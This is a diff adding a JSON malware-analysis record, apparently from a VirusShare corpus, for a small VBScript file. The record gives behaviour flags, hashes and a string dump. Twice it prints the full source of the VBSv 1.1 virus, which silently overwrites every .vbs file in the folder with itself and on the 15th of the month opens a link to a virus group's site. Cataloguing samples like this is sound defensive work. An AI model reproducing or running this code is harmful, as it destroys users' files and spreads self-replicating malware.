@@ -1,0 +1,53 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Chr": "May attempt to obfuscate specific str",
+            "CreateObject": "May create an OLE object",
+            "Run": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows",
+            "Wscript.Shell": "May run an executable file or a system command",
+            "vbHide": "May run an executable file or a system command"
+        },
+        "macro": "'VBSv Version 1.1 by Lord Natas/CodeBreakers\n'First Windows Scripting Virus\n\nSet WshShell = Wscript.CreateObject(\"Wscript.Shell\")\n\nCommandPath = WSHShell.ExpandEnvironmentStrings(\"%comspec%\")\n\nWshShell.Run (CommandPath & \" /c for %%a in (*.vbs) do copy /y \" & Wscript.ScriptFullName & \" %%a >nul\"), vbHide\n\nIf Day(Now()) = 15 Then\n\nWScript.Echo \"VBSv v1.1\" & Chr(13) & \"by Lord Natas/CodeBreakers\"\n\nSet oUrlLink = WshShell.CreateShortcut(\"The CodeBreakers.URL\")\noUrlLink.TargetPath = \"http://www.codebreakers.org\"\noUrlLink.Save\n\nWshShell.Run (\"THECOD~1.URL\")\n\nEnd If"
+    },
+    "filename": "VirusShare_44b5acd580fe6017e7f3c9b48ab01f5d",
+    "filesize": 587,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "44b5acd580fe6017e7f3c9b48ab01f5d",
+        "sha1": "5d0385ab436a5ac8e9e83407fda49fa2e2a3ba7c",
+        "sha256": "40850e2831d680dd723710d31b433aa1550de286ba3fbed5f5426684841fc06e"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "'VBSv Version 1.1 by Lord Natas/CodeBreakers",
+            "'First Windows Scripting Virus",
+            "Set WshShell = Wscript.CreateObject(\"Wscript.Shell\")",
+            "CommandPath = WSHShell.ExpandEnvironmentStrings(\"%comspec%\")",
+            "WshShell.Run (CommandPath & \" /c for %%a in (*.vbs) do copy /y \" & Wscript.ScriptFullName & \" %%a >nul\"), vbHide",
+            "If Day(Now()) = 15 Then",
+            "WScript.Echo \"VBSv v1.1\" & Chr(13) & \"by Lord Natas/CodeBreakers\"",
+            "Set oUrlLink = WshShell.CreateShortcut(\"The CodeBreakers.URL\")",
+            "oUrlLink.TargetPath = \"http://www.codebreakers.org\"",
+            "oUrlLink.Save",
+            "WshShell.Run (\"THECOD~1.URL\")",
+            "End If"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.codebreakers.org"
+        ]
+    },
+    "time": "0:00:00.268917",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
